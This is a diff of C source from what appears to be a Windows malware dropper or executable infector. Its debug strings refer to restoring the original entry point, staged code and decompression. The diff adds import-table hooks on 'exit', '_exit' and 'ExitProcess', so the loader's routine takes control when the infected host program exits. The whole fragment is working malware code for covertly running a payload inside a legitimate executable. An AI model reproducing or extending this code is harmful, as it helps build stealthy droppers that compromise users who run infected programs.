@@ -118,26 +118,29 @@ char * _needed_strings[] = {
 	"\\",					// 11
 	"USER32.DLL",			// 12
 	"RtlExitUserProcess",	// 13
+	"exit",					// 14
+	"_exit",				// 15
+	"ExitProcess",			// 16
 	
 #ifdef _DEBUG
-	"Error creating directory", // 14
-	"ExitProcess index %d", // 15
-	"ExitProcess hooked",   // 16
-	"Restoring OEP code",	// 17
-	"exit hooked",			// 18
-	"OEP restored!",		// 19
-	"Calling OEP @ %08x",	// 20
-	"Error creating file",  // 21
-	"Calling HFF5 ...",		// 22
-	"HFF5 called!",			// 23
-	"In ExitProcess Hook",  // 24
-	"Quitting vector NOW!", // 25
-	"VerifyVersionInfo @ %08x", // 26
-	"Sys MajorVersion %d", // 27
-	"Sys MinorVersion %d", // 28
-	"Restoring stage1 code", // 29
-	"Restoring stage2 code", // 30
-	"Error uncompressing!",  // 31
+	"Error creating directory", // 17
+	"ExitProcess index %d", // 18
+	"ExitProcess hooked",   // 19
+	"Restoring OEP code",	// 20
+	"exit hooked",			// 21
+	"OEP restored!",		// 22
+	"Calling OEP @ %08x",	// 23
+	"Error creating file",  // 24
+	"Calling HFF5 ...",		// 25
+	"HFF5 called!",			// 26
+	"In ExitProcess Hook",  // 27
+	"Quitting vector NOW!", // 28
+	"VerifyVersionInfo @ %08x", // 29
+	"Sys MajorVersion %d", // 30
+	"Sys MinorVersion %d", // 31
+	"Restoring stage1 code", // 32
+	"Restoring stage2 code", // 33
+	"Error uncompressing!",  // 34
 #endif
 
 	NULL
@@ -523,6 +526,31 @@ NEXT_ENTRY:
 				PAGE_EXECUTE_READWRITE,
 				&oldProtect);
 		}
+	}
+
+	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+	if (pfn_HookCall && IAT_rva)
+	{
+		pfn_HookCall(STRING(STRIDX_MSVCRT_DLL),
+			STRING(STRIDX_EXITCALL),
+			(DWORD)pfn_ExitProcessHook,
+			IAT_rva,
+			imageBase,
+			header);
+		
+		pfn_HookCall(STRING(STRIDX_MSVCRT_DLL),
+			STRING(STRIDX__EXITCALL),
+			(DWORD)pfn_ExitProcessHook,
+			IAT_rva,
+			imageBase,
+			header);
+		
+		pfn_HookCall(STRING(STRIDX_KERNEL32_DLL),
+			STRING(STRING_EXITPROCESS),
+			(DWORD)pfn_ExitProcessHook,
+			IAT_rva,
+			imageBase,
+			header);
 	}
 	
 	//
